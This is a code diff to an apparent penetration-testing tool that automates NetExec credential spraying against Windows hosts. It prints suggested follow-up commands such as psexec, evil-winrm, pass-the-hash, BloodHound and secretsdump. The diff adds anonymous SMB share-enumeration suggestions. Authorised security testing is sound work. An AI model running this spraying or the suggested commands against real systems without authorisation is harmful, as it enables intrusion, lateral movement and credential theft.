@@ -40,7 +40,6 @@ BOLD = "\033[1m"
 DIM = "\033[2m"
 RESET = "\033[0m"
 
-# Original ANSI values kept so _configure_colors can restore them if needed
 _COLOR_DEFAULTS = {
     "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
     "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
@@ -49,7 +48,6 @@ _COLOR_DEFAULTS = {
 
 
 def _configure_colors(no_color: bool) -> None:
-    """Strip ANSI codes when stdout is not a TTY or --no-color is set."""
     global RED, GREEN, YELLOW, BLUE, CYAN, BOLD, DIM, RESET
     if no_color or not sys.stdout.isatty():
         RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
@@ -68,7 +66,6 @@ NETEXEC_TIMEOUT = 30
 BANNER_WIDTH = 60
 PROGRESS_CLEAR_WIDTH = 70
 
-# Standard credential-based command templates
 COMMAND_TEMPLATES = {
     "winrm": "evil-winrm -i {ip} -u {user} -p '{password}'",
     "smb":   "impacket-psexec {domain}/{user}:'{password}'@{ip}",
@@ -79,7 +76,6 @@ COMMAND_TEMPLATES = {
     "ldap":  "ldapdomaindump -u '{domain}\\{user}' -p '{password}' {ip}",
 }
 
-# Pass-the-hash command templates (triggered with -H flag)
 HASH_TEMPLATES = {
     "winrm": "evil-winrm -i {ip} -u {user} -H {hash}",
     "smb":   "impacket-psexec {domain}/{user}@{ip} -hashes :{hash}",
@@ -88,7 +84,6 @@ HASH_TEMPLATES = {
     "mssql": "impacket-mssqlclient {domain}/{user}@{ip} -hashes :{hash} -windows-auth",
 }
 
-# DC-specific commands (replaces generic templates when target is identified as a DC)
 DC_COMMAND_TEMPLATES = {
     "ldap": [
         ("BloodHound",     "bloodhound-python -u {user} -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {ip} -c All --zip"),
@@ -112,6 +107,17 @@ DC_HASH_TEMPLATES = {
         ("secretsdump",    "impacket-secretsdump {domain}/{user}@{ip} -hashes :{hash}"),
     ],
 }
+
+# ── Anonymous SMB follow-up commands ────────────────────────────────────────
+# These are printed whenever anonymous SMB login succeeds.
+# {ip} is substituted with the real target IP at print time.
+ANON_SMB_COMMANDS = [
+    ("smbclient (list shares)",  "smbclient -L //{ip} -N"),
+    ("smbclient (connect)",      "smbclient //{ip}/<SHARE> -N"),
+    ("enum4linux",               "enum4linux -a {ip}"),
+    ("nmap smb-enum-shares",     "nmap --script smb-enum-shares,smb-enum-users -p 445 {ip}"),
+    ("nxc smb shares",           "nxc smb {ip} -u '' -p '' --shares"),
+]
 
 TaskKey = tuple[str, bool]
 ParsedStatus = tuple[str, str]
@@ -152,7 +158,6 @@ CONNECTIVITY_TIMEOUT_PATTERNS = (
 
 
 class NxcAutomator:
-    """Run nxc across all protocols with combination or linear credential pairing."""
 
     def __init__(
         self,
@@ -188,7 +193,6 @@ class NxcAutomator:
 
     @classmethod
     def _read_value_or_file(cls, source: str) -> list[str]:
-        """Return direct value as one-item list, or load non-empty lines from file."""
         return cls._read_lines(source) if os.path.isfile(source) else [source]
 
     @staticmethod
@@ -196,7 +200,6 @@ class NxcAutomator:
         return "local" if local_auth else "domain"
 
     def _task_label(self, protocol: str, local_auth: bool) -> str:
-        """Return standardized display label for protocol/auth scope."""
         return f"{protocol.upper()} ({self._auth_scope(local_auth)})"
 
     @staticmethod
@@ -225,7 +228,6 @@ class NxcAutomator:
             filled = int(bar_len * self.completed / self.total_tasks)
             bar = f"{'█' * filled}{'░' * (bar_len - filled)}"
             pct = int(100 * self.completed / self.total_tasks)
-
             elapsed = time.time() - self.scan_start_time if self.scan_start_time else 0
             if elapsed > 0 and self.completed > 0:
                 rate = self.completed / elapsed
@@ -234,7 +236,6 @@ class NxcAutomator:
                 eta_str = f" ETA {eta_secs}s" if eta_secs < 9999 else " ETA --"
             else:
                 eta_str = ""
-
             sys.stderr.write(
                 f"\r  {DIM}{bar} {pct:3d}% ({self.completed}/{self.total_tasks}){eta_str}{RESET}"
             )
@@ -251,7 +252,6 @@ class NxcAutomator:
             self._redraw_progress()
 
     def _print_live(self, msg: str):
-        """Print a finding in real-time, temporarily clearing the progress bar."""
         with self.lock:
             sys.stderr.write("\r" + " " * PROGRESS_CLEAR_WIDTH + "\r")
             sys.stderr.flush()
@@ -304,26 +304,20 @@ class NxcAutomator:
         return any(pattern in text for pattern in patterns)
 
     def _classify_attempt_output(self, stdout: str, stderr: str) -> AttemptClassification:
-        """Classify one nxc run to decide timeout skip behavior."""
         combined = "\n".join(part for part in (stdout, stderr) if part).lower()
         if not combined:
             return "ambiguous"
-
         if self._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
             return "credential_response"
-
         if self._contains_any_pattern(combined, CONNECTIVITY_TIMEOUT_PATTERNS):
             return "connectivity_timeout"
-
         for raw_line in (stdout + "\n" + stderr).split("\n"):
             marker, _ = self._parse_nxc_line(raw_line.strip())
             if marker in ("[+]", "[-]", "[*]", "[!]"):
                 return "credential_response"
-
         return "ambiguous"
 
     def _format_stderr_block(self, stderr: str, fallback_marker: str) -> str | None:
-        """Convert stderr lines to parseable status lines for result summary."""
         formatted: list[str] = []
         for raw_line in stderr.split("\n"):
             line = raw_line.strip()
@@ -337,7 +331,6 @@ class NxcAutomator:
         return "\n".join(formatted) if formatted else None
 
     def _run_protocol_task(self, protocol: str, target: str, local_auth: bool = False) -> list[str]:
-        """Run all credential pairs for one protocol/auth-type, return captured output."""
         output_lines: list[str] = []
         timeout_count = 0
         total_per_task = len(self.credential_pairs)
@@ -349,27 +342,22 @@ class NxcAutomator:
                 stdout = (result.stdout or "").strip()
                 stderr = (result.stderr or "").strip()
                 classification = self._classify_attempt_output(stdout, stderr)
-
                 if stdout:
                     output_lines.append(stdout)
                     self._report_success_lines(stdout, protocol, local_auth)
-
                 if stderr and (not stdout or classification == "connectivity_timeout"):
                     marker = "[!]" if classification == "connectivity_timeout" else "[-]"
                     stderr_block = self._format_stderr_block(stderr, marker)
                     if stderr_block:
                         output_lines.append(stderr_block)
-
                 if classification == "connectivity_timeout":
                     timeout_count += 1
                 else:
                     timeout_count = 0
             except subprocess.TimeoutExpired:
                 timeout_count += 1
-
             ran += 1
             self._update_progress()
-
             if timeout_count >= MAX_RETRY:
                 output_lines.append(f"[!] {MAX_RETRY} consecutive timeouts — skipped")
                 label = self._task_label(protocol, local_auth)
@@ -383,7 +371,6 @@ class NxcAutomator:
         return output_lines
 
     def _run_anon_smb(self, target: str) -> list[str]:
-        """Check for anonymous SMB access using empty credentials."""
         output_lines: list[str] = []
         cmd = ["nxc", "smb", target, "-u", "", "-p", "",
                "--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file]
@@ -409,10 +396,6 @@ class NxcAutomator:
 
     @staticmethod
     def _parse_nxc_line(line: str) -> tuple[str | None, str]:
-        """Extract status marker and message from nxc output.
-
-        'SMB  10.x.x.x  445  DC01  [+] dom\\user:pass' -> ('[+]', 'dom\\user:pass')
-        """
         for marker in ("[+]", "[-]", "[*]", "[!]"):
             idx = line.find(marker)
             if idx != -1:
@@ -421,7 +404,6 @@ class NxcAutomator:
 
     @staticmethod
     def _extract_target_info(results: dict) -> str | None:
-        """Get first [*] info line to display target OS/host details once."""
         for blocks in results.values():
             for block in blocks:
                 for line in block.split("\n"):
@@ -432,12 +414,6 @@ class NxcAutomator:
 
     @staticmethod
     def _extract_ip_from_nxc_line(line: str) -> str | None:
-        """Pull the resolved host IP from a raw nxc output line.
-
-        nxc lines look like:
-          SMB  192.168.219.55  445  DC01  [+] ...
-        The IP is always the second whitespace-separated token.
-        """
         parts = line.split()
         if len(parts) >= 2:
             match = re.match(r"^\d{1,3}(\.\d{1,3}){3}$", parts[1])
@@ -446,7 +422,6 @@ class NxcAutomator:
         return None
 
     def _extract_real_ip(self, results: dict, anon_smb_results: list[str]) -> str | None:
-        """Return the first real host IP seen across all raw nxc output blocks."""
         all_blocks: list[str] = list(anon_smb_results)
         for blocks in results.values():
             all_blocks.extend(blocks)
@@ -459,7 +434,6 @@ class NxcAutomator:
 
     @staticmethod
     def _is_domain_controller(target_info: str | None) -> bool:
-        """Detect if the target is a DC from the nxc [*] info line."""
         if not target_info:
             return False
         info_lower = target_info.lower()
@@ -471,7 +445,6 @@ class NxcAutomator:
         return False
 
     def _parse_credentials(self, msg: str) -> tuple[str, str, str]:
-        """Parse domain, user, password from a nxc success message string."""
         domain, user, password = "", "", ""
         try:
             if "\\" in msg:
@@ -485,8 +458,17 @@ class NxcAutomator:
             pass
         return domain, user, password
 
+    # ── NEW: print follow-up commands for anonymous SMB ─────────────────────
+    def _print_anon_smb_commands(self, real_ip: str):
+        """Print suggested next-step commands when anonymous SMB login succeeds."""
+        print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
+        print(f"  {'─' * (BANNER_WIDTH - 2)}")
+        for label, template in ANON_SMB_COMMANDS:
+            cmd = template.format(ip=real_ip)
+            print(f"    {YELLOW}►{RESET} {BOLD}{label:<28}{RESET} {cmd}")
+        print()
+
     def _print_suggested_commands(self, target: str, successes: list[tuple[str, str]], is_dc: bool, hostname: str = ""):
-        """Print suggested follow-up commands based on successful protocols."""
         seen_protocols: set[str] = set()
         command_blocks: list[tuple[str, list[tuple[str, str]]]] = []
 
@@ -556,13 +538,11 @@ class NxcAutomator:
         self.total_tasks = len(tasks) * pair_count
         self.scan_start_time = time.time()
         results: dict[TaskKey, list[str]] = {}
-
         with ThreadPoolExecutor(max_workers=self.workers) as pool:
             futures: dict = {}
             for protocol, local_auth in tasks:
                 fut = pool.submit(self._run_protocol_task, protocol, target, local_auth)
                 futures[fut] = (protocol, local_auth)
-
             for future in as_completed(futures):
                 key = futures[future]
                 try:
@@ -579,7 +559,6 @@ class NxcAutomator:
         anon_smb_results: list[str],
         elapsed: float = 0.0,
     ) -> tuple[list[tuple[str, str]], bool, str, str]:
-        """Print per-target results. Returns (successes, is_dc, hostname, real_ip)."""
         target_info = self._extract_target_info(results)
         is_dc = self._is_domain_controller(target_info)
         real_ip = self._extract_real_ip(results, anon_smb_results) or target
@@ -602,6 +581,7 @@ class NxcAutomator:
 
         successes: list[tuple[str, str]] = []
         no_output_protos: set[str] = set()
+        anon_smb_success = False  # track whether anon SMB worked
 
         # ── Anonymous SMB block ──────────────────────────────────────
         if anon_smb_results:
@@ -617,6 +597,7 @@ class NxcAutomator:
                     if marker == "[+]":
                         print(f"{prefix} {YELLOW}{msg}{RESET}")
                         successes.append((label, msg))
+                        anon_smb_success = True  # flag it
                     elif marker == "[-]" and not self.quiet:
                         print(f"{prefix} {DIM}{msg}{RESET}")
                     elif marker == "[!]":
@@ -627,25 +608,19 @@ class NxcAutomator:
             key = (protocol, local_auth)
             label = self._task_label(protocol, local_auth)
             blocks = results.get(key, [])
-
             if not blocks:
                 no_output_protos.add(protocol.upper())
                 continue
-
             parsed = self._parse_status_blocks(blocks)
-
             if not parsed:
                 no_output_protos.add(protocol.upper())
                 continue
-
             icon = self._status_icon(parsed)
-
             for i, (marker, msg) in enumerate(parsed):
                 if i == 0:
                     prefix = f"  {icon} {BOLD}{label:<20}{RESET}"
                 else:
                     prefix = f"      {'':<20}"
-
                 if marker == "[+]":
                     print(f"{prefix} {GREEN}{msg}{RESET}")
                     successes.append((label, msg))
@@ -660,6 +635,10 @@ class NxcAutomator:
             print(f"\n  {DIM}── No response: {names}{RESET}")
 
         print(f"\n{'─' * BANNER_WIDTH}")
+
+        # ── Print anonymous SMB follow-up commands if anon login worked ──
+        if anon_smb_success:
+            self._print_anon_smb_commands(real_ip)
 
         if successes:
             print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
@@ -678,7 +657,6 @@ class NxcAutomator:
         return successes, is_dc, hostname, real_ip
 
     def _print_summary_table(self, summary: list[dict]):
-        """Print a rollup table after scanning multiple targets."""
         total_success = sum(1 for s in summary if s["successes"])
         print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
         print(f"  {CYAN}{BOLD}📊 Scan Summary{RESET}  {DIM}({len(summary)} targets){RESET}")
@@ -699,7 +677,6 @@ class NxcAutomator:
         print(f"{'═' * BANNER_WIDTH}\n")
 
     def _write_json_output(self, summary: list[dict]):
-        """Write scan findings to a JSON file."""
         output = {
             "scan_time": datetime.now().isoformat(),
             "log_file": self.log_file,
@@ -734,27 +711,20 @@ class NxcAutomator:
 
         for target in self.targets:
             print(f"  {GREEN}{BOLD}► {target}{RESET}\n")
-
             tasks = self._build_protocol_tasks()
             target_start = time.time()
-
-            # Run anonymous SMB check and credentialled scans concurrently
             anon_smb_results: list[str] = []
             with ThreadPoolExecutor(max_workers=2) as outer:
                 anon_future = outer.submit(self._run_anon_smb, target)
                 cred_future = outer.submit(self._collect_target_results, target, tasks, pair_count)
                 anon_smb_results = anon_future.result()
                 results = cred_future.result()
-
             elapsed = time.time() - target_start
-
             sys.stderr.write("\r" + " " * PROGRESS_CLEAR_WIDTH + "\r")
             sys.stderr.flush()
-
             successes, is_dc, hostname, real_ip = self._print_target_results(
                 target, results, tasks, anon_smb_results, elapsed
             )
-
             summary.append({
                 "target": target,
                 "real_ip": real_ip,
@@ -772,7 +742,6 @@ class NxcAutomator:
 
 
 def parse_mode(value: str) -> str:
-    """Validate accepted mode values."""
     mode = value.lower()
     if mode in ("combination", "linear"):
         return mode
@@ -785,25 +754,12 @@ def parse_args():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
-  # Basic usage with credentials
   netexec-automator -t 192.168.1.10 -u admin -p 'Password123'
-
-  # Spray credentials across a target list
   netexec-automator -t targets.txt -u users.txt -p passwords.txt
-
-  # Supply an NTLM hash for pass-the-hash command suggestions
   netexec-automator -t 192.168.1.10 -u administrator -p '' -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-
-  # Linear mode (pairs users[0]:passwords[0], users[1]:passwords[1], ...)
   netexec-automator -t targets.txt -u users.txt -p passwords.txt -m linear
-
-  # Quiet mode — suppress banner and negative results, show findings only
   netexec-automator -t 192.168.1.10 -u admin -p 'Password123' -q
-
-  # Disable color for piped/logged output
   netexec-automator -t 192.168.1.10 -u admin -p 'Password123' --no-color | tee scan.txt
-
-  # Write findings to a JSON file
   netexec-automator -t targets.txt -u users.txt -p passwords.txt --json-output results.json
         """
     )
@@ -814,8 +770,7 @@ examples:
     parser.add_argument("-p", "--password", required=True,
                         help="Password or path to passwords file")
     parser.add_argument("-H", "--hash",
-                        help="NTLM hash (LM:NT or :NT) — used to populate pass-the-hash "
-                             "command suggestions in output (e.g. -H aad3b...:31d6c...)")
+                        help="NTLM hash (LM:NT or :NT) for pass-the-hash command suggestions")
     parser.add_argument("-o", "--output",
                         help="Custom log file path (default: YYYY-MM-DD_HH-MM-SS.txt)")
     parser.add_argument("-w", "--workers",  type=int, default=DEFAULT_WORKERS,
@@ -825,15 +780,14 @@ examples:
         type=parse_mode,
         default="combination",
         metavar="{combination,linear}",
-        help="Credential pairing mode: combination (cartesian product, default) "
-             "or linear (index-matched pairs)",
+        help="Credential pairing mode: combination (default) or linear",
     )
     parser.add_argument("-q", "--quiet",    action="store_true",
                         help="Suppress banner and negative results; show findings only")
     parser.add_argument("--no-color",       action="store_true",
-                        help="Disable ANSI color codes (auto-detected for non-TTY output)")
+                        help="Disable ANSI color codes")
     parser.add_argument("--json-output",    metavar="FILE",
-                        help="Write findings to a JSON file at the given path")
+                        help="Write findings to a JSON file")
     return parser.parse_args()
 
 
